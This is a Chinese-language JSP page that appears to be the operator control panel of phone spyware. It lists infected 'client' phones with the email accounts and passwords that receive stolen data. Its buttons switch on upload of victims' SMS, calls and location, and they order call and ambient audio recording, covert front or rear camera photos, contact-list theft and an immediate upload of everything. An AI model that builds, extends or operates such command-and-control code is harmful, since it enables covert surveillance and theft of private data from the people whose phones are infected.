<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
<%
	String path = request.getContextPath();
	String basePath = request.getScheme() + "://"
			+ request.getServerName() + ":" + request.getServerPort()
			+ path + "/";
%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<base href="<%=basePath%>">

<title>客户端设置</title>

<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="cache-control" content="no-cache">
<meta http-equiv="expires" content="0">
<meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
<meta http-equiv="description" content="This is my page">
<link href="css/style.css" rel="stylesheet" type="text/css" />
<script src="js/jquery-1.8.3.js"></script>
<script type="text/javascript">
	var id=-1;
	function clientChange(uid,name,phone,email,pass,sms,call,loc,count,callrecord){
		id=uid;
		$("#name").val(name);
		$("#phone").val(phone);
		$("#email").val(email);
		$("#pass").val(pass);
		$("input[name='sms'][value="+sms+"]").attr("checked",true);
		$("input[name='call'][value="+call+"]").attr("checked",true);
		$("input[name='loc'][value="+loc+"]").attr("checked",true);
		$("#count").val(count);
		$("input[name='callrecord'][value="+callrecord+"]").attr("checked",true);
	}
	
	
	function updatebase(){
		if(id==-1){
			alert("请选择客户端");
			return;
		}
		var name=$("#name").val();
		var phone=$("#phone").val();
		var email=$("#email").val();
		var pass=$("#pass").val();
		if(name.length<=0){
			alert("昵称不能为空");
			return;
		}
		if(!phone.match(/^1[3|4|5|8][0-9]\d{4,8}$/)){
			alert("号码格式不正确");
			return;
		}
		if(!email.match(/^[\w._]+@(163)\.[cC][oO][mM](\r\n|\r|\n)?$/)){
			alert("邮箱必须是163邮箱");
			return;
		}
		if(pass.length<=0){
			alert("密码不能为空");
			return;
		}
		$.post("<%=basePath%>control/server!UpdateDeviceBase.action",{"mapparam.id":id,"mapparam.name":name,"mapparam.phone":phone,"mapparam.email":email,"mapparam.pass":pass},function(msg){
			if(msg.state==0){
				alert(msg.msg);
			}else{
				alert(msg.msg);
				window.open ("<%=basePath%>control/server!GetClientList.action", "_self");
			}
		}, "json");
	}
	function updateUpload(){
		if(id==-1){
			alert("请选择客户端");
			return;
		}
		var sms=$("input[name='sms']:checked").val();
		var call=$("input[name='call']:checked").val();
		var loc=$("input[name='loc']:checked").val();
		var count=$("#count").val();
		if(!count.match(/\d+$/)){
			alert("必须为正整数");
			return;
		}
		var action="{\"sms\":"+sms+",\"call\":"+call+",\"loc\":"+loc+",\"count\":"+count+"}";
		$.post("<%=basePath%>control/server!SetUploadConfig.action",{"mapparam.id":id,"mapparam.action":action},function(msg){
			if(msg.state==0){
				alert(msg.msg);
			}else{
				alert(msg.msg);
			}
		}, "json");
	}
	function updateCallRecord(){
		if(id==-1){
			alert("请选择客户端");
			return;
		}
		var callrecord=$("input[name='callrecord']:checked").val();
		var action="{\"callrecord\":\""+callrecord+"\"}";
		$.post("<%=basePath%>control/server!UpdateCallRecord.action",{"mapparam.id":id,"mapparam.action":action},function(msg){
			if(msg.state==0){
				alert(msg.msg);
			}else{
				alert(msg.msg);
			}
		}, "json");
	}
	function SendRecordAction(){
		if(id==-1){
			alert("请选择客户端");
			return;
		}
		var recordsc=$("#recordsc").val();
		if(!recordsc.match(/\d+$/)){
			alert("必须为正整数");
			return;
		}
		var action="{\"record\":\""+recordsc+"\"}";
		$.post("<%=basePath%>control/server!sendToClient.action",{"mapparam.id":id,"mapparam.action":action},function(msg){
			if(msg.state==0){
				alert(msg.msg);
			}else{
				alert(msg.msg);
			}
		}, "json");
	}
	function SendPhotoAction(){
		if(id==-1){
			alert("请选择客户端");
			return;
		}
		var callrecord=$("input[name='camera']:checked").val();
		var action="{\"camera\":"+callrecord+"}";
		$.post("<%=basePath%>control/server!sendToClient.action",{"mapparam.id":id,"mapparam.action":action},function(msg){
			if(msg.state==0){
				alert(msg.msg);
			}else{
				alert(msg.msg);
			}
		}, "json");
	}
	function SendTongXunLuAction(){
		if(id==-1){
			alert("请选择客户端");
			return;
		}
		var action="{\"address\":true}";
		$.post("<%=basePath%>control/server!sendToClient.action",{"mapparam.id":id,"mapparam.action":action},function(msg){
			if(msg.state==0){
				alert(msg.msg);
			}else{
				alert(msg.msg);
			}
		}, "json");
	}
	function SendLocationAction(){
		if(id==-1){
			alert("请选择客户端");
			return;
		}
		var action="{\"location\":true}";
		$.post("<%=basePath%>control/server!sendToClient.action",{"mapparam.id":id,"mapparam.action":action},function(msg){
			if(msg.state==0){
				alert(msg.msg);
			}else{
				alert(msg.msg);
			}
		}, "json");
	}
	function SendAllAction(){
		if(id==-1){
			alert("请选择客户端");
			return;
		}
		var action="{\"all\":true}";
		$.post("<%=basePath%>control/server!sendToClient.action",{"mapparam.id":id,"mapparam.action":action},function(msg){
			if(msg.state==0){
				alert(msg.msg);
			}else{
				alert(msg.msg);
			}
		}, "json");
	}
</script>
<%
	Object oc=session.getAttribute("userid");
	if(oc==null){
%>
	<script type="text/javascript">
		window.open('<%=basePath%>userlogin.jsp','_parent');
	</script>
<%} %>
</head>

<body>
	<div style="padding:10px;font-size: 18px;width:950px;margin:0 auto;">测试请联系多少QQ或是电话之类的测试请联系多少QQ或是电话之类的测试请联系多少QQ或是电话之类的</div>
	<div id="Nav">
		<div class="BarLeft"></div>
		<div id="NavContent">
			<div id="ContentLeftTopText"><a href="<%=basePath%>userupdatepass.jsp">修改密码</a></div>
		</div>
		<div class="BarRight"></div>
		<div class="Cal"></div>
	</div>
	<div id="Content">
		<div id="ContentLeft">
			<div id="ContentLeftTop">
				<div class="BarLeft"></div>
				<div id="ContentLeftTopText">客户端列表</div>
				<div class="BarRight"></div>
				<div class="Cal"></div>
			</div>
			<div id="ContentLeftBox">
				<ul>
					<c:forEach items="${map.data }" var="ms">
					<li><input type="radio" name="client" onchange="clientChange('${ms.id }','${ms.clientname }','${ms.phone }','${ms.email }','${ms.pass }','${ms.sms }','${ms.call }','${ms.loc }','${ms.count }','${ms.callrecord }')"> ${ms.clientname } ${ms.phone }</li>
					</c:forEach>
				</ul>
			</div>
		</div>
		<div id="ContentRight" style="margin-bottom: 100px">
			<div id="ContentRightTop">
				<div class="BarLeft"></div>
				<div id="ContentRightTopText">客户端设置</div>
				<div class="BarRight"></div>
				<div class="Cal"></div>
			</div>
			<div id="ContentRightBox">
				<fieldset style="padding: 8px;border:1px solid #CCC;">
					<legend>客户端信息</legend>
					<table width="100%" cellpadding="0" class="Table1"
						bordercolor="#4ab902" border="1" cellspacing="0">
						<tr>
							<td height="25" align="right">昵称：</td>
							<td><input type="text" class="Input" id="name"></td>
						</tr>
						<tr>
							<td height="25" align="right">手机号码：</td>
							<td><input type="text"  class="Input" id="phone"></td>
						</tr>
						<tr>
							<td height="25" align="right">邮箱账号：</td>
							<td><input type="text"  class="Input" id="email"></td>
						</tr>
						<tr>
							<td height="25" align="right">邮箱密码：</td>
							<td><input type="password"  class="Input" id="pass"></td>
						</tr>
						</table>
						<div style="width: 100%;text-align: right;padding-top: 5px;padding-right: 10px">
							<button style="width: 20%"  class="Button" onclick="updatebase()">确定修改</button>
						</div>
					
				</fieldset>
				<fieldset style="padding: 8px;border:1px solid #CCC;margin-top: 10px">
					<legend>上传设置</legend>
					<table width="100%" cellpadding="0" class="Table1"
						bordercolor="#4ab902" border="1" cellspacing="0">
						<tr>
							<td height="25" align="right">短信：</td>
							<td>
								<input type="radio" name="sms" value="true">开
								<input type="radio" name="sms" value="false">关
							</td>
						</tr>
						<tr>
							<td height="25" align="right">通话：</td>
							<td>
								<input type="radio" name="call" value="true">开
								<input type="radio" name="call" value="false">关
							</td>
						</tr>
						<tr>
							<td height="25" align="right">位置：</td>
							<td>
								<input type="radio" name="loc" value="true">开
								<input type="radio" name="loc" value="false">关
							</td>
						</tr>
						<tr>
							<td height="25" align="right">上传条数：</td>
							<td><input type="text"  class="Input" id="count"></td>
						</tr>
						</table>
						<div style="width: 100%;text-align: right;padding-top: 5px;padding-right: 10px">
							<button style="width: 20%"  class="Button" onclick="updateUpload()">确定修改</button>
						</div>
					
				</fieldset>
				<fieldset style="padding: 8px;border:1px solid #CCC;margin-top: 10px">
					<legend>通话录音</legend>
					<table width="100%" cellpadding="0" class="Table1"
						bordercolor="#4ab902" border="1" cellspacing="0">
						<tr>
							<td height="25" align="right">录音：</td>
							<td>
								<input type="radio" name="callrecord" value="call">双向
								<input type="radio" name="callrecord" value="mic">单向
							</td>
						</tr>
						</table>
						<div style="width: 100%;text-align: right;padding-top: 5px;padding-right: 10px">
							<button style="width: 20%"  class="Button" onclick="updateCallRecord()">确定修改</button>
						</div>
					
				</fieldset>
				<fieldset style="padding: 8px;border:1px solid #CCC;margin-top: 10px">
					<legend>环境录音</legend>
					<table width="100%" cellpadding="0" class="Table1"
						bordercolor="#4ab902" border="1" cellspacing="0">
						<tr>
							<td height="25" align="right">环境录音：</td>
							<td><input type="text"  class="Input" id="recordsc"></td>
						</tr>
						</table>
						<div style="width: 100%;text-align: right;padding-top: 5px;padding-right: 10px">
							<button style="width: 20%"  class="Button" onclick="SendRecordAction()">发送指令</button>
						</div>
					
				</fieldset>
				<fieldset style="padding: 8px;border:1px solid #CCC;margin-top: 10px">
					<legend>环境拍照</legend>
					<table width="100%" cellpadding="0" class="Table1"
						bordercolor="#4ab902" border="1" cellspacing="0">
						<tr>
							<td height="25" align="right">拍照：</td>
							<td>
								<input type="radio" name="camera" value="1" checked="checked">前摄像头
								<input type="radio" name="camera" value="0">后摄像头
							</td>
						</tr>
						</table>
						<div style="width: 100%;text-align: right;padding-top: 5px;padding-right: 10px">
							<button style="width: 20%"  class="Button" onclick="SendPhotoAction()">发送指令</button>
						</div>
					
				</fieldset>
				<fieldset style="padding: 8px;border:1px solid #CCC;margin-top: 10px;">
					<legend>其他设置</legend>
					
						<div style="width: 100%;text-align: right;padding-top: 5px;padding-right: 10px">
							<button style="width: 20%"  class="Button" onclick="SendTongXunLuAction()">获取通讯录</button>
							<button style="width: 20%"  class="Button" onclick="SendLocationAction()">获取位置</button>
							<button style="width: 20%"  class="Button" onclick="SendAllAction()">立即上传</button>
							
						</div>
					
				</fieldset>
			</div>
		</div>
	</div>

</body>
</html>
